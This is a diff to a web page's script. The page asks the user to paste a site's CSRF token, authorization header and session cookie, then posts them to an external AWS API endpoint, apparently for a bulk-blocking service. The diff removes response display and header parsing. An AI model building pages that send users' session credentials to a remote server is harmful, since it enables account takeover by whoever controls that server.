@@ -97,62 +97,27 @@
         <button class="btn" id="saveButton">Save</button>
         <div id="responseContainer" class="response-container"></div>
     </div>
-
+</body>
     <script>
         document.getElementById('saveButton').addEventListener('click', function() {
-
             const input1 = document.getElementById('input1').value;
             const input2 = document.getElementById('input2').value;
             const input3 = document.getElementById('input3').value;
 
-            const xcsrf = input1.replace("x-csrf-token: ", "");
-            const authorization = input2.replace("authorization: ", "");
-            const Cookie = input3.replace("Cookie: ", "").replace('"', '\\"');
+            
 
-            const headers = {
-                "x-csrf-token": '"' + xcsrf + '"',
-                "authorization": '"' + authorization + '"',
-                "Cookie": '"' + Cookie + '"'
+            const data = {
+                "x-csrf-token": input1,
+                "authorization": input2,
+                "Cookie": input3
             };
 
-            const data = JSON.stringify(headers);
-
-            fetch("https://4sly7iji2m.execute-api.eu-north-1.amazonaws.com/sss", {
+            fetch('https://4sly7iji2m.execute-api.eu-north-1.amazonaws.com/sss' , {
                 method: 'POST',
                 headers: {
-                    'Content-Type': 'application/json',
+                    'Content-Type': 'application/json'
                 },
-                body: JSON.stringify(data),
-            })
-            .then(response => response.json())
-            .then(data => {
-                displayResponse(data, true);
-            })
-            .catch((error) => {
-                displayResponse(error, false);
-            });
-        });
-
-        function displayResponse(response, success) {
-            const responseContainer = document.getElementById('responseContainer');
-            responseContainer.innerHTML = '';
-
-            if (success) {
-                responseContainer.classList.add('success');
-                responseContainer.classList.remove('error');
-                responseContainer.innerHTML = `
-                    <p><strong>Success!</strong></p>
-                    <p>Successful Blocks: ${response.successful_blocks}</p>
-                    <p>Unsuccessful Blocks: ${response.unsuccessful_blocks}</p>
-                `;
-            } else {
-                responseContainer.classList.add('error');
-                responseContainer.classList.remove('success');
-                responseContainer.innerHTML = `
-                    <p><strong>Error:</strong> ${response}</p>
-                `;
-            }
-        }
+                body: JSON.stringify(data)
+            })})
     </script>
-</body>
 </html>
